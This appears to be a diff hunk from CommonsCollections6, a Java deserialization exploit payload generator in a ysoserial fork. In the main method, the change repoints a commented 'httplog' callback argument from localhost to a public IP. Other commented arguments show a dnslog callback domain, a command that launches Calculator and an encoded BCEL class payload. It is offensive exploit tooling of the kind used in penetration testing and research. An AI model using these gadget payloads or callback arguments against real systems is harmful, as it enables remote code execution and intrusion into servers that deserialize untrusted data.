@@ -87,7 +87,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
     public static void main(String[] args) throws Exception {
         //args = new String[]{"sleep:10"};
         //args = new String[]{"dnslog:xxx.0omga2.dnslog.cn"};
-        //args = new String[]{"httplog:http://127.0.0.1:1665/a.xml"};
+        //args = new String[]{"httplog:http://119.3.108.224:54/a.xml"};
         //args = new String[]{"linx_cmd:open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
         //args = new String[]{"bcel:$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$dbN$C1$Q$3d$e5$b6$80$a8$I$e2$fd$86O$60$a2$8d$cf$Y$8d$SMLP$8ck4$c4$a7$b26X$b2t7$bb$c5$e0g$f9$a2$c6D$3f$c0$8f2$ce$f2$80$a8$9dt$d2sf$a6$a7$d3$f9$fcz$fb$A$b0$8b$cd$y2$udQ$c4$ac$85R$gsi$cc$a7$b1$Q$R$8b$W$96$y$y3$a4$f6$94Vf$9f$n$5e$a9$5e3$q$ea$de$9dd$98n$u$z$cf$fb$bd$b6$M$aeD$db$r$s$7b$3cp$a4o$94$a7C$L$x$84m$af$l8$f2DE$c1L$5d$b8$ceNW$3c$88$i$b2$98$b0$b0$9a$c3$g$d6$Z$f2$R$c7$5d$a1$3b$dc6$81$d2$j$G$8b$b7$95$e6$e1$3dCl$dba8$f2$7c$a97$b8$fd$Y$g$d9$e3$87$be$ef$wG$Mexti$df$V$c6$Lv$84$ef$f3$ba$a7$8d$d4$s$e4g$c2i$dac$d1$i6P$8e$9eN$cc$_$c9f$bb$x$j$c3P$iR$ca$e3$a7$cdQ$X$M3$3f$89$97$7dmT$_$ea$b2$p$cd$I$94$w$d5$c6$bf$9c$g$J$c9$81$q$a1J$e5$b6$f1$b7$bd$dax$c5E$e092$Mk$u$pM$83$88$W$p$a3$PB$M9B$HH$S$G$d6$b7$5e$c0$5e$RK$bd$p$de$8a$X$Sv$xQH$da$add$ne$3f$c3$bay$g$WN$92$9fB$9c$7c$82$yI$ff$9b$o$i$n$g$X$ed$3c$9dc$98$f9$G$e8$GDW$fd$B$A$A"};
         //args = new String[]{"bcel_class_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.class"};
